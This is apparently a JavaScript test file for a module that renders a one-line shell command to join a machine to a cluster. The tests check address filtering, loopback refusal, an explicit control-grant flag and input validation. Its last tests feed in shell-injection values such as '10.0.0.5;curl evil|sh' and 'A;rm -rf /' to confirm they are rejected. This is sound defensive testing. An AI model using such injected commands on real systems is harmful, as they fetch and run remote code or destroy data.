// SPDX-License-Identifier: AGPL-3.0-only

// This string carries a credential to another machine. The cases below are the
// ones where rendering *something* would be worse than rendering nothing.

import { expect, test } from 'bun:test';
import { bestAddress, dialableAddresses, joinCommand } from './joincommand.js';

test('an ordinary invitation renders one pasteable line', () => {
  const cmd = joinCommand({ code: '12345678', addresses: ['10.10.10.1'] });
  expect(cmd).toContain('--join 12345678@10.10.10.1');
  expect(cmd).toContain('install.sh');
  expect(cmd.split('\n')).toHaveLength(1);
});

test('the first address wins, because the agent already ordered them', () => {
  const cmd = joinCommand({ code: '12345678', addresses: ['10.10.10.1', '192.168.1.5'] });
  expect(cmd).toContain('@10.10.10.1');
});

// A command naming loopback installs cleanly and then fails to pair, on the far
// machine, which is the most confusing failure available here.
test('loopback is never offered to another machine', () => {
  expect(bestAddress(['127.0.0.1', '10.0.0.4'])).toBe('10.0.0.4');
  expect(bestAddress(['::1', '10.0.0.4'])).toBe('10.0.0.4');
  expect(bestAddress(['127.0.1.1'])).toBeNull();
});

test('no usable address renders nothing rather than half a command', () => {
  expect(joinCommand({ code: '12345678', addresses: [] })).toBe('');
  expect(joinCommand({ code: '12345678', addresses: ['127.0.0.1'] })).toBe('');
});

test('no code renders nothing', () => {
  expect(joinCommand({ code: '', addresses: ['10.0.0.1'] })).toBe('');
  expect(joinCommand(null)).toBe('');
  expect(joinCommand({ addresses: ['10.0.0.1'] })).toBe('');
});

test('junk in the address list is skipped rather than rendered', () => {
  expect(bestAddress([null, undefined, '  ', '10.0.0.9'])).toBe('10.0.0.9');
  expect(bestAddress(null)).toBeNull();
});

test('the control grant is a visible flag, not an implication of joining', () => {
  const join = { code: '12345678', addresses: ['10.10.10.1'] };
  expect(joinCommand(join)).not.toContain('--grant-control');
  expect(joinCommand(join, true)).toContain('--grant-control');
  // It must sit at the end of the same one-liner, so the operator reads it on
  // the line they are pasting rather than discovering it afterwards.
  expect(joinCommand(join, true).endsWith('--grant-control')).toBe(true);
});

test('no address still means no command, grant or not', () => {
  // Half an invitation with a privilege flag on the end is worse than none.
  expect(joinCommand({ code: '12345678', addresses: [] }, true)).toBe('');
  expect(joinCommand({ code: '', addresses: ['10.0.0.1'] }, true)).toBe('');
});

test('every network the inviter offered reaches the pasted line', () => {
  // The real reply from a DGX: two RoCE fabric addresses, then the LAN one.
  // A laptop can dial only the last; another DGX is best served by the first.
  // Naming one means guessing which machine the operator walked to.
  const cmd = joinCommand({
    code: '71673005',
    addresses: ['10.10.10.9', '10.10.10.13', '192.168.68.68']
  });
  expect(cmd).toContain('--join 71673005@10.10.10.9,10.10.10.13,192.168.68.68');
});

test('order is preserved, because it is the inviter\'s link ranking', () => {
  expect(dialableAddresses(['10.10.10.9', '192.168.68.68'])).toEqual([
    '10.10.10.9',
    '192.168.68.68'
  ]);
});

test('loopback never reaches the command, at any position', () => {
  // It would install cleanly and then fail to pair — and in a list, a bad
  // entry is easier to miss than it was as the only one.
  const cmd = joinCommand({
    code: '12345678',
    addresses: ['127.0.0.1', '10.0.0.9', '::1', '127.0.1.1']
  });
  expect(cmd).toContain('--join 12345678@10.0.0.9');
  expect(cmd).not.toContain('127.');
  expect(cmd).not.toContain('::1');
});

test('a repeated address is not pasted twice', () => {
  // Two interfaces can report the same address; a duplicate in the command
  // would make the joiner dial it twice while looking like a third option.
  expect(dialableAddresses(['10.0.0.9', '10.0.0.9', '192.168.1.5'])).toEqual([
    '10.0.0.9',
    '192.168.1.5'
  ]);
});

test('the troubleshooting host is the first of the same list', () => {
  // One filter, so the copy beside the command can never name a machine the
  // command does not.
  const addresses = ['10.10.10.9', '192.168.68.68'];
  expect(bestAddress(addresses)).toBe(dialableAddresses(addresses)[0]);
});

// ── This line is pasted into a shell on a machine someone just walked to, and
// the control page is served over plain http on a LAN, so the socket feeding
// these addresses is not authenticated. Each case below rendered a complete,
// pasteable command before.

test('a shell metacharacter never reaches the pasted line', () => {
  expect(joinCommand({ code: 'ABC123', addresses: ['10.0.0.5;curl evil|sh'] })).toBe('');
  expect(joinCommand({ code: 'ABC123', addresses: ['10.0.0.5 --unsafe'] })).toBe('');
  expect(joinCommand({ code: 'A;rm -rf /', addresses: ['10.0.0.5'] })).toBe('');
});

test('a non-string address is dropped, not coerced to [object Object]', () => {
  // Node addresses ARE objects elsewhere in this protocol, so one shape drift
  // would otherwise ship a command that looks pasteable and cannot work.
  expect(dialableAddresses([{ addr: '10.0.0.5' }])).toEqual([]);
  expect(dialableAddresses([null, undefined, 42, '10.0.0.5'])).toEqual(['10.0.0.5']);
});

test('a comma inside a host cannot forge a second host', () => {
  expect(dialableAddresses(['10.0.0.5,evil.example'])).toEqual([]);
});

test('every spelling of loopback is refused, not just 127.0.0.1', () => {
  // Each installs cleanly and then fails to pair — the most confusing
  // failure available here, per this module's own header.
  for (const a of ['localhost', 'localhost:8443', '[::1]:8443', '::1',
                   '::ffff:127.0.0.1', '0:0:0:0:0:0:0:1', '127.0.1.1']) {
    expect(dialableAddresses([a])).toEqual([]);
  }
});

test('the forms an operator actually needs still render', () => {
  expect(dialableAddresses(['10.10.10.9', '[fe80::1]:34334', 'spark-256a', 'host:9000']))
    .toEqual(['10.10.10.9', '[fe80::1]:34334', 'spark-256a', 'host:9000']);
});
